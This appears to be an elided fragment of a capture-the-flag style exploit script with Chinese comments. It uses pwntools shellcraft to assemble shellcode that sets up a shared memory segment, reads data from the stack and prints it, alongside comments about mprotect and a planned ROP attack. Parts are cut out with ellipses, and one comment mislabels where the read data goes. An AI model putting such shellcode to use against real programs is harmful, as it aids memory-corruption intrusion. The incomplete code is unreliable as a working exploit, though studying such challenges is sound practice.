...
# 组合常量值 
#reset the permission of the target memory (mprotect)
...
################################################################
# 定義共享內存的shellcode，用於後續的ROP攻擊
size = 4096
#使用 SYS_shmget 系統調用創建一個共享內存段。0x1337 是共享內存段的鍵值
shellcode = shellcraft.syscall('SYS_shmget', 0x1337, size,  0) 
# shm_readonly = ctypes.c_int(0o400)
# 使用 SYS_shmat 系統調用將共享內存段附加到進程的地址空間
...
# # 接收数据
shellcode += shellcraft.read('r8', 'rsp', 100)  # 从套接字中读取100个字节，保存到rsp寄存器
# shellcode += shellcraft.recv(, 'rsp', 100)
# # 打印接收到的数据
shellcode += shellcraft.write(1, 'rsp', 100)  # 将接收到的数据写入标准输出
shellcode += shellcraft.exit( 37)
sh3 = asm(shellcode)
